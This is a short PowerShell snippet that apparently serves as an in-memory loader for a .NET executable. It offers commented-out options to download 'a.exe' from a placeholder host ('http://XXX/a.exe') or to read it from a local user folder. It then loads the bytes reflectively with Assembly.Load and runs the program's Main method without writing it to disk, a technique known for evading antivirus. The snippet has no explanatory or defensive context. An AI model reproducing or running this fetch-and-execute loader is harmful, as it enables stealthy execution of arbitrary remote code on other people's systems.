#Load from web
#$bytes = (new-object net.webclient).downloaddata('http://XXX/a.exe')
#Load from local
#$path = 'C:\Users\Administrador\a.exe'
#$bytes = [System.IO.File]::ReadAllBytes($path)
[System.Reflection.Assembly]::Load($bytes)
[Reflection.Program]::Main()